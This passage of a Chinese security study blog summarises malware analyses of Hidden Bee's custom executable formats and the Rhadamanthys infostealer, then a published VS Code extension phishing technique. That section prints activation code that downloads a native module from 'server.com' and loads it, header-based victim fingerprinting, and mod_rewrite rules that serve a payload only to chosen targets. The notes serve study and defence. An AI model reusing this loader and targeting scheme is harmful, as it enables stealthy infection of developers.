<p>&emsp;对于自定义的可执行文件格式，其导入和重定位相对容易，但是如果原始PE文件中有异常表，那么就会有问题。<code>try...catch...</code>块中， <code>try</code>块可能会引发异常，而<code>catch</code>块是通常处理异常的地方。这些处理程序的列表存储在异常表中。</p>
<p>&emsp;下面是一个<code>NE</code>模块执行的<code>main</code>函数，如下：</p>
<p><img src="/images/news-and-good-article/image-20230910211810897.png" alt="image-20230910211810897" style="zoom:67%;" /></p>
<p>&emsp;对<code>main</code>函数解析如下：</p>
<p>（1）检查魔术字是否<code>EN</code>，检查通过后，会通过<code>add_dynamic_seh_handlers</code>函数初始化异常目录。</p>
<p>（2）错误模式设置为<code>0x8003 -&gt; SEM_NOOPENFILEERRORBOX | SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS</code>。这意味着所有错误消息都会被静音，很可能是为了确保隐秘性，以防模块内的某些异常无法得到正确处理。</p>
<p>&emsp;接下来分析<code>add_dynamic_seh_handlers</code>，其为程序实现自定义模块的异常处理：</p>
<p><img src="/images/news-and-good-article/image-20230910212244185.png" alt="image-20230910212244185" style="zoom:67%;" /></p>
<p>&emsp;其流程解释为：从模块获取异常表，然后通过<code>RtlAddFunctionTable</code>进行初始化。上述 API 函数只能用于 64 位二进制文件，并且没有 32 位等效函数，对于32位模块，如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230910212939296.png" alt="image-20230910212939296" style="zoom:67%;" /></p>
<p>&emsp;其流程为：钩取<code>NTDLL</code>中的异常调度程序 (<code>KiUserExceptionDispatcher</code>)。更准确地说，<code>RtlDispatchException</code>中对 <code>ZwQueryInformationProcess</code>的调用被重定向到代理函数。<code>NTDLL</code>中对<code>ZwQueryInformationProcess</code>的原始调用（下图红色部分）已被替换为：</p>
<p><img src="/images/news-and-good-article/image-20230910213302129.png" alt="image-20230910213302129" style="zoom:67%;" /></p>
<p>&emsp;红色部分的新模块<code>proxy_func</code>位于<code>NE</code>模块内：</p>
<p><img src="/images/news-and-good-article/image-20230910213603962.png" alt="image-20230910213603962" style="zoom:67%;" /></p>
<p>&emsp;此函数检测对<code>ZwQueryInformationProcess</code>的调用并更改其结果。首先，调用该函数的原始版本。如果它返回<code>0 (STATUS_SUCCESS)</code>，则在输出上设置一个附加标志（<code>ImageDispatchEnable</code>）（这样为啥就能做异常处理？）。Hidden Bee使用的代理函数与Rhadamanthys的代理函数相同。这样的话，<code>NE</code>模块就被认为是有效内存映射，这样就能找到异常处理程序。其实现在：<a target="_blank" rel="noopener" href="https://github.com/hasherezade/libpeconv/blob/master/tests/test_case7/main.cpp">链接</a>。</p>
<h4 id="NS"><a href="#NS" class="headerlink" title="NS"></a>NS</h4><p><img src="/images/news-and-good-article/image-20230910215834708.png" alt="image-20230910215834708" style="zoom:67%;" /></p>
<p>&emsp;NS 标识符之后是 Machine ID，它与 PE 文件头中的值完全相同，用于区分模块是 32 位还是 64 位。接下来是最小化的Data Directory，它仅包含 6 条记录，每个记录都包含 RVA 和大小，以 DWORD 形式给出。紧接着Data Directory之后，有一个Section列表（其数量在header中指定）。仅包含 4 个字段：RVA、大小、Raw addr和特征。</p>
<p>&emsp;与 PE 格式的原始结构相比，导入表结构略小。如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230910222904198.png" alt="image-20230910222904198" style="zoom:67%;" /></p>
<p>&emsp;总结一下，NS的头为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> WORD NS_MAGIC = <span class="number">0x534e</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> ns_exe &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> NS_DATA_DIR_COUNT = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">data_dir_id</span> &#123;</span><br><span class="line">        NS_IMPORTS = <span class="number">1</span>,</span><br><span class="line">        NS_RELOCATIONS = <span class="number">3</span>,</span><br><span class="line">        NS_IAT = <span class="number">4</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">        DWORD dir_va;</span><br><span class="line">        DWORD dir_size;</span><br><span class="line">    &#125; t_NS_data_dir;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">        DWORD va;</span><br><span class="line">        DWORD size;</span><br><span class="line">        DWORD raw_addr;</span><br><span class="line">        DWORD characteristics;</span><br><span class="line">    &#125; t_NS_section;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">        DWORD dll_name_rva;</span><br><span class="line">        DWORD original_first_thunk;</span><br><span class="line">        DWORD first_thunk;</span><br><span class="line">        DWORD unknown;</span><br><span class="line">    &#125; t_NS_import;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">NS_format</span> &#123;</span><br><span class="line">        <span class="comment">// 0x534e</span></span><br><span class="line">        WORD magic;</span><br><span class="line">        WORD machine_id;</span><br><span class="line">        WORD sections_count;</span><br><span class="line">        WORD hdr_size;</span><br><span class="line">        DWORD entry_point;</span><br><span class="line">        DWORD module_size;</span><br><span class="line">        DWORD image_base;</span><br><span class="line">        DWORD image_base_high;</span><br><span class="line">        DWORD saved;</span><br><span class="line">        DWORD unknown1;</span><br><span class="line">        t_NS_data_dir data_dir[NS_DATA_DIR_COUNT];</span><br><span class="line">        t_NS_section sections[SECTIONS_COUNT];</span><br><span class="line">    &#125; t_NS_format;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>&emsp;其转换器为：<a target="_blank" rel="noopener" href="https://github.com/hasherezade/hidden_bee_tools/blob/master/bee_lvl2_converter/ns_exe.cpp">链接</a>。下面展示Hidden Bee加载NS格式的<code>驱动程序</code>：</p>
<p><img src="/images/news-and-good-article/image-20230910224342439.png" alt="image-20230910224342439" style="zoom:67%;" /></p>
<p>To be continued…</p>
<h2 id="Rhadamanthys分析"><a href="#Rhadamanthys分析" class="headerlink" title="Rhadamanthys分析"></a>Rhadamanthys分析</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://research.checkpoint.com/2023/rhadamanthys-the-everything-bagel-infostealer/">链接1</a>，<a target="_blank" rel="noopener" href="https://elis531989.medium.com/dancing-with-shellcodes-analyzing-rhadamanthys-stealer-3c4986966a88">链接2</a>。</p>
<p>&emsp;Rhadamanthys是一种高级信息窃取程序。感觉这是KingCrete的技术成长日记哈哈哈。Rhadamanthys的功能极为丰富，可以窃取好多信息，如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230907143141058.png" alt="image-20230907143141058" style="zoom:67%;" /></p>
<p>（1）创建一个堆，并将<code>.rdata</code>中的blob写入堆，之后解密为shellcode。</p>
<p>（2）使用<code>VirtualAlloc</code>创建新分配的内存，之后调用<code>memcpy</code>将shellcode从堆复制到新内存。然后，使用<code>VirtualProtect</code>将内存段的权限改为<code>RWX</code>。接下来，再将shellcode转移到新地址（<code>0x42F6F0</code>）。</p>
<p>（3）使用回调函数运行shellcode，具体而言，函数1中调用<code>ImmEnumInputContext</code>（此API中的第2个参数可以是一个函数，这是一个回调函数，在调用<code>ImmEnumInputContext</code>时触发运行此函数。），此时第2个参数为shellcode。为什么不用<code>CreateThread\CreateRemoteThread</code>？这是为了防检测啦。</p>
<p>（4）将shellcode dump下来并用Blobrunner调试，但是文章中用IDA调试的。</p>
<p>&emsp;&emsp;（a）<code>sub_45029E</code>：</p>
<p><img src="/images/news-and-good-article/image-20230907160538384.png" alt="image-20230907160538384" style="zoom:67%;" /></p>
<p>&emsp;&emsp;其中，<code>sub_450249</code>是通过访问进程环境块以获取<code>kenel32.dll</code>的地址。<code>sub_45036E</code>是在<code>kernel32.dll</code>中找某函数返回，这些函数为<code>VirtualAlloc|LocalFree|LocalAlloc|VirtualFree</code>。<code>sub_450077</code>将解密shellcode中的数据，并写入<code>LocalAlloc</code>分配的内存。<code>v8[0]</code>函数则是对<code>VirtualAlloc</code>的调用。<code>sub_45003A</code>则是将解密shellcode中的数据复制到另一位置。最后，到<code>v3()</code>则跳转到其他shellcode。</p>
<p>&emsp;&emsp;（b）第2个shellcode，是Rhadamanthys的核心，里面也有一些反调试（主要是从<code>al-khaser</code>中用的）。例如，检测虚拟环境（vmware、vbox）与沙箱如下：</p>
<p><img src="/images/news-and-good-article/image-20230907161811793.png" alt="image-20230907161811793" style="zoom:67%;" /></p>
<p><img src="/images/news-and-good-article/image-20230907161824400.png" alt="image-20230907161824400" style="zoom:67%;" /></p>
<p><img src="/images/news-and-good-article/image-20230907161913575.png" alt="image-20230907161913575" style="zoom:67%;" /></p>
<p>&emsp;&emsp;检查与安全相关的dll：</p>
<p><img src="/images/news-and-good-article/image-20230907161957222.png" alt="image-20230907161957222" style="zoom:67%;" /></p>
<p>&emsp;&emsp;Rhadamanthys的异常处理（SEH）操作非常有趣，SEH可以被认为是有两个指针的链表，分别指向下一条SEH记录、处理错误代码的函数。如何使用？</p>
<p>&emsp;&emsp;Step1：获取<code>ZwQueryInformationProcess</code>的地址，并以自身进程做参数，查找自身进程的信息。</p>
<p>&emsp;&emsp;Step2：获取<code>KiUserExceptionDispatcher</code>的地址（SEH），并开始迭代搜索，找出哪些错误处理函数调用了<code>ZwQueryInformationProcess</code>。如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230907164222634.png" alt="image-20230907164222634" style="zoom:67%;" /></p>
<p>&emsp;&emsp;Step3：在<code>sub_5A5C</code>中，此功能为将<code>ZwQueryInformationProcess</code>函数挂钩子。如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230907164629637.png" alt="image-20230907164629637" style="zoom:67%;" /></p>
<p>&emsp;&emsp;如何运行？当SEH处理函数中调用<code>ZwQueryInformationProcess</code>时，会被替换成钩子函数，钩子函数会执行<code>ZwQueryInformationProcess</code>并将<code>ProcessInformation</code>修改为<code>0x6D</code>，该标志决定是否允许在加载模块的内存空间之外执行。即，它允许对 shellcode 执行异常处理（没太懂，感觉是shellcode自己写了某些seh处理函数？）。如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230907165556779.png" alt="image-20230907165556779" style="zoom:67%;" /></p>
<p>&emsp;&emsp;Rhadamanthys在SEH链中默认注册了<code>_except_handler</code>函数，由shellcode触发的每个异常都会到达这里。此做法是为了避免在触发错误时引起怀疑。具体流程如下所示（感觉主要是怕shellcode引起异常时没有seh函数处理，并且对可能暴露的地方<code>ZwQueryInformationProcess</code>进行伪装，就是钩取）：</p>
<p><img src="/images/news-and-good-article/image-20230907171314490.png" alt="image-20230907171314490" style="zoom:67%;" /></p>
<p>&emsp;&emsp;之后，将调用<code>setErrorMode</code>并以<code>0x8003</code>作为参数。<code>0x8003</code>代表：不显示严重错误处理程序消息框、不显示 Windows 错误报告对话框、OpenFile 函数在找不到文件时不显示消息框。换句话说，加载程序不希望系统在屏幕上显示任何错误，并且希望自己处理它们。这是Rhadamanthys为了不引起任何怀疑而采取的另一种策略。</p>
<p>&emsp;&emsp;为了反检测，Rhadamanthys创建互斥锁并冒充是合法的（这部分感觉有点迷）。还有Rhadamanthys为了防止自己被挂钩子，它是这样做的：（1）获取<code>ntdll.dll</code>的句柄并将其加载到虚拟内存中（从文件中载入？），然后获取已加载的真实<code>ntdll.dll</code>的句柄。（2）它将<code>ZwProtectVirtualMemory</code>的<code>SYSCALL</code>的字节复制到另一个虚拟内存中，以便在不显式使用<code>ntdll</code>地址空间中的 <code>ZwProtectVirtualMemory</code>的情况下使用它。（3）获取真模块和假模块（从文件中载入）的导出表，并对它们进行迭代。使用<code>memcmp</code>进行比较，如果发现不同，加载器将改变真模块<code>ntdll</code>中函数的保护，并使用<code>memcpy</code>将数据从假模块复制到真模块。通过这种方式，Rhadamanthys验证是否设置钩子。</p>
<p>&emsp;&emsp;除了<code>ntdll.dll</code>之外，Rhadamanthys还检查<code>user32.dll|advapi32.dll|ole32.dll</code>。之后，解密数据（<code>rc4</code>算法），可以得到<code>C2</code>服务器地址。接下来，进行网络配置，首先使用<code>GetUserDefaultLangID</code>与<code>GetLocaleInfoW</code>获取主机默认语言与所在区域。Rhadamanthys动态解析多个函数（例如<code>socket</code>、<code>WSAIotcl</code>和<code>CreateCompletionPort</code>）以使用 IOCP 套接字模型。Rhadamanthys使用<code>WSAIoctl</code>调用 <code>LPFN_CONNECTEX</code>的处理程序以使用<code>ConnectEx</code>函数，最终，Rhadamanthys与<code>WSARecv</code>和<code>WSASend</code>进行通信。</p>
<p>&emsp;&emsp;之后，将在C2下载dll，并命名为<code>nsis_uns[xxx].dll</code>。接下来，使用<code>Rundll32</code>命令运行<code>xxx.dll</code>中的<code>xxx</code>函数。</p>
<p>&emsp;&emsp;Rhadamanthys中有NSIS模块，专门用于收集数据。NSIS模块分为加载器与真正的代码。加载器是通过很长的命令执行的，且其检出率很低。对于加载器，其使用<code>LocalAlloc</code>分配内存，并使用<code>MapViewOfFile</code>和<code>memmove</code>将其复制到内存，最终转到shellcode。这个shellcode用于解压与注入Rhadamanthys本身的内存。</p>
<p>&emsp;&emsp;实际能力在此忽略，不是很重要感觉。</p>
<h2 id="基于VS-Code的钓鱼"><a href="#基于VS-Code的钓鱼" class="headerlink" title="基于VS Code的钓鱼"></a>基于VS Code的钓鱼</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2023/08/leveraging-vscode-extensions-for-initial-access/">链接</a>。</p>
<p>&emsp;vscode安装扩展的方法：UI视图（最常用的做法）、<code>.vsix</code>扩展文件、VSCode URI处理程序安装扩展。其中，VSCode URI处理程序安装扩展指的是以<code>vscode://URI</code>来安装扩展。安装VSCode时，会自动注册<code>vscode://URI</code>协议处理程序。如下所示：</p>
<p><img src="/images/news-and-good-article/image-20230914181122418.png" alt="image-20230914181122418" style="zoom:67%;" /></p>
<p>&emsp;当在浏览器中输入<code>vscode://URI</code>时，会执行<code>&quot;%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe&quot; &quot;--open-url&quot; &quot;--&quot; &quot;vscode://URI&quot;</code>。在这条指令中，会调用<code>vscode</code>的<code>/src/vs/code/electron-main/app.ts</code>中的<code>handleProtocolUrl</code>函数，如下所示：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">async</span> <span class="title function_">handleProtocolUrl</span>(<span class="attr">windowsMainService</span>: <span class="title class_">IWindowsMainService</span>, <span class="attr">urlService</span>: <span class="title class_">IURLService</span>, <span class="attr">uri</span>: <span class="variable constant_">URI</span>, options?: <span class="title class_">IOpenURLOptions</span>): <span class="title class_">Promise</span>&lt;<span class="built_in">boolean</span>&gt; &#123;</span><br><span class="line">    	<span class="comment">// 打开 vscode 窗口</span></span><br><span class="line">		<span class="keyword">if</span> (shouldOpenInNewWindow) &#123;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">logService</span>.<span class="title function_">trace</span>(<span class="string">&#x27;app#handleProtocolUrl() opening empty window and passing in protocol url:&#x27;</span>, uri.<span class="title function_">toString</span>(<span class="literal">true</span>));</span><br><span class="line">			<span class="keyword">const</span> <span class="variable language_">window</span> = <span class="title function_">firstOrDefault</span>(<span class="keyword">await</span> windowsMainService.<span class="title function_">open</span>(&#123;</span><br><span class="line">				<span class="attr">context</span>: <span class="title class_">OpenContext</span>.<span class="property">API</span>,</span><br><span class="line">				<span class="attr">cli</span>: &#123;...<span class="variable language_">this</span>.<span class="property">environmentMainService</span>.<span class="property">args</span>&#125;,</span><br><span class="line">				<span class="attr">forceNewWindow</span>: <span class="literal">true</span>,</span><br><span class="line">				<span class="attr">forceEmpty</span>: <span class="literal">true</span>,</span><br><span class="line">				<span class="attr">gotoLineMode</span>: <span class="literal">true</span>,</span><br><span class="line">				<span class="attr">remoteAuthority</span>: <span class="title function_">getRemoteAuthority</span>(uri)    <span class="comment">// 读取 URI 并绑定到新开启的 vscode</span></span><br><span class="line">			&#125;));</span><br><span class="line">			<span class="keyword">await</span> <span class="variable language_">window</span>?.<span class="title function_">ready</span>();</span><br><span class="line">             <span class="comment">// 打开 uri 服务</span></span><br><span class="line">			<span class="keyword">return</span> urlService.<span class="title function_">open</span>(uri, options);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;<code>urlService.open</code>函数将URI的值转发给vscode中所有其他已注册的URI处理程序，其中一种处理程序为<code>/src/vs/workbench/services/extensions/browser/extensionUrlHandler.ts</code>，用于与vscode中已安装的扩展进行交互。</p>
<p>&emsp;vscode中uri的格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> vscode://hellothere.test</span><br><span class="line">  \_/     \________/ \_/</span><br><span class="line">   |          |       |  </span><br><span class="line">Scheme   PublisherID ExtensionName </span><br></pre></td></tr></table></figure>
<p>&emsp;首先，根据正则表达式检查URI是否为扩展程序（匹配<code>PublisherID+ExtensionName</code>）：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isExtensionId</span>(<span class="params">value: <span class="built_in">string</span></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/^[a-z0-9][a-z0-9\-]*\.[a-z0-9][a-z0-9\-]*$/i</span>.<span class="title function_">test</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;如果检查完扩展程序，则接下来检查扩展是否安装。若未安装，则向vscode的marketplace发送POST请求以搜索扩展。如果找到结果，则会返回指向扩展的VSIX包位置的URL。然后提示用户下载并安装扩展。初始 POST 请求的<code>extensionsGallery</code>服务器值是从存储在<code>%LOCALAPPDATA%\Programs\Microsoft VS Code\resources\app\product.json</code>中的<code>serviceUrl</code>变量中读取的。<code>serviceUrl</code>变量的值为：<code>https://marketplace.visualstudio.com/_apis/public/gallery</code>。因此，只能下载<code>marketplace</code>的扩展。</p>
<p>&emsp;那我们想钓鱼，那么就得让受害者下载我们自己写的扩展，那咋办咧？答案是将我们写的扩展发布到<code>marketplace</code>中。我们写好发布商名称与发布商id，之后就可以上传<code>.vsix</code>扩展文件，并由微软扫描。<code>.vsix</code>中的<code>package.json</code>中定义了扩展名。扩展名可以写为<code>com</code>。此时vscode会提示：</p>
<p><img src="/images/news-and-good-article/image-20230914200249736.png" alt="image-20230914200249736" style="zoom:67%;" /></p>
<p>&emsp;我们不想让vscode向用户显示这一点。经过研究，<code>package.json</code>定义了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;name&quot;: &quot;com&quot;,</span><br><span class="line">&quot;displayName&quot;: &quot;My Extension Name&quot;</span><br></pre></td></tr></table></figure>
<p>&emsp;此时就会向用户显示：<code>&#39;My Extension Name&#39; is not installed.</code>。此时，我们写<code>vscode://targetdomain.com/internal/path.html?login=true</code>，其中<code>targetdomain</code>为发行商id，<code>com/internal/path.html?login=true</code>为扩展名（有一个疑问是前面的正则不会匹配失败吗？）。</p>
<p>&emsp;接下来，就要编写扩展的代码。在<a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/">链接</a>中描述了如何生成恶意的vscode扩展。在扩展（js）中，可以让其调用C++的代码，这用到了<code>Node Native-Addons</code>技术，相当于dll。扩展逻辑为：从远程服务器获取<code>Node Native-Addons</code>的代码，并使用<code>require()</code>加载到扩展中。（这样微软在提交<code>.vsix</code>的时候就很难扫描出来）</p>
<p>&emsp;如下代码在扩展初始激活时运行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 描述参数 context 的类型为 vscode.ExtensionContext</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">vscode.ExtensionContext</span>&#125; <span class="variable">context</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">activate</span>(<span class="params">context</span>) &#123;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">get_data</span>(<span class="params">data, outfile</span>)&#123;</span><br><span class="line">		fs.<span class="title function_">writeFileSync</span>(outfile, data);</span><br><span class="line">		<span class="keyword">if</span>(outfile.<span class="title function_">endsWith</span>(<span class="string">&quot;.node&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">// 使用 require() 导入刚接收到的数据</span></span><br><span class="line">			<span class="built_in">require</span>(process.<span class="property">env</span>.<span class="property">LOCALAPPDATA</span> + <span class="string">&quot;/encoding.node&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get_module</span>(<span class="params">path, outfile</span>) &#123;</span><br><span class="line">        <span class="comment">// path = &quot;/api/v1/custom.js&quot;</span></span><br><span class="line">        <span class="comment">// outfile = &quot;.../encoding.node&quot;</span></span><br><span class="line">		<span class="keyword">var</span> options = &#123;</span><br><span class="line">			<span class="attr">hostname</span>: <span class="string">&quot;server.com&quot;</span>,</span><br><span class="line">			<span class="attr">path</span>: path,</span><br><span class="line">			<span class="attr">port</span>: <span class="number">443</span>,</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">			https.<span class="title function_">get</span>(options, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">				<span class="keyword">var</span> data = [];</span><br><span class="line">                <span class="comment">// 监听 data 事件，将接收到的数据放入 data 数组</span></span><br><span class="line">                <span class="comment">// 监听 end 事件，data -&gt; buffer，并调用 get_data 函数</span></span><br><span class="line">				res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123; data.<span class="title function_">push</span>(chunk); &#125;).<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">					<span class="keyword">var</span> buffer = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(data);</span><br><span class="line">					<span class="title function_">get_data</span>(buffer, outfile);</span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;) </span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 立即执行 get_module() 函数</span></span><br><span class="line">	(<span class="keyword">async</span> () =&gt; <span class="keyword">await</span> <span class="title function_">get_module</span>(<span class="string">&quot;/api/v1/custom.js&quot;</span>, process.<span class="property">env</span>.<span class="property">LOCALAPPDATA</span> + <span class="string">&quot;/encoding.node&quot;</span>))();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;可以丰富<code>options</code>，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get_module</span>(<span class="params">path, outfile</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> options = &#123;</span><br><span class="line">		<span class="attr">hostname</span>: <span class="string">&quot;server.com&quot;</span>,</span><br><span class="line">		<span class="attr">path</span>: path,</span><br><span class="line">		<span class="attr">port</span>: <span class="number">443</span>,</span><br><span class="line">		<span class="attr">headers</span>: &#123;</span><br><span class="line">			 <span class="string">&#x27;X-VSCode-Domain&#x27;</span>: process.<span class="property">env</span>.<span class="property">USERDOMAIN</span>,</span><br><span class="line">			 <span class="string">&#x27;X-VSCode-User&#x27;</span>: process.<span class="property">env</span>.<span class="property">USERNAME</span>,</span><br><span class="line">			 <span class="string">&#x27;X-VSCode-Arch&#x27;</span>: process.<span class="property">env</span>.<span class="property">PROCESSOR_ARCHITECTURE</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;这样的话，就可以针对特定人群进行感染。主要可以在文件下载服务器的Apache上使用<code>mod_rewrite</code>模块写以下机制（当匹配成功时就给恶意代码，否则给正常代码）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># If domain is correct</span><br><span class="line">RewriteCond %&#123;HTTP:X-VSCode-Domain&#125; =targetdomain</span><br><span class="line"># And username is correct</span><br><span class="line">RewriteCond %&#123;HTTP:X-VSCode-User&#125; =victim</span><br><span class="line"># Then send payload</span><br><span class="line">RewriteRule ^.*$ &quot;/files/payload.node&quot; [END]</span><br><span class="line"># Else send benign file</span><br><span class="line">RewriteRule ^.*$ &quot;/files/fake.node&quot; [END]</span><br></pre></td></tr></table></figure>
<h3 id="感染过程"><a href="#感染过程" class="headerlink" title="感染过程"></a>感染过程</h3><p>&emsp;分发如下url：<code>vscode://targetdomain.com/internal/login.html</code>，此时已经注册了名为<code>com/internal/login.html</code>的包，打开并安装就钓鱼成功。</p>
<h2 id="什么是好的linux内核漏洞？"><a href="#什么是好的linux内核漏洞？" class="headerlink" title="什么是好的linux内核漏洞？"></a>什么是好的linux内核漏洞？</h2><p>&emsp;文章<a target="_blank" rel="noopener" href="https://blog.isosceles.com/what-is-a-good-linux-kernel-bug/">链接</a>。</p>
<p>&emsp;好的漏洞：不太容易发现，不会造成崩溃，是否被程序经常使用，是否能被黑客可靠的利用。从攻击者的角度来看，一个好的错误是一个高度可利用的错误，并且会影响攻击者真正关心的许多平台。其中很多具体的技术资料，在此就略过，要不耗时太长了。</p>
<h2 id="HTMLSmuggler：绕过IDS和通过HTML走私传递的JS有效负载生成器"><a href="#HTMLSmuggler：绕过IDS和通过HTML走私传递的JS有效负载生成器" class="headerlink" title="HTMLSmuggler：绕过IDS和通过HTML走私传递的JS有效负载生成器"></a>HTMLSmuggler：绕过IDS和通过HTML走私传递的JS有效负载生成器</h2><h3 id="HTML走私"><a href="#HTML走私" class="headerlink" title="HTML走私"></a>HTML走私</h3><p>&emsp;HTML走私：浏览器根据HTML文件的内容在主机上<strong>创建恶意文件，而不是转发/下载恶意软件</strong>。HTML走私可以通过在HTML页面中将恶意文件隐藏为编码后的字符串来绕过安全性检查和在线检测。</p>
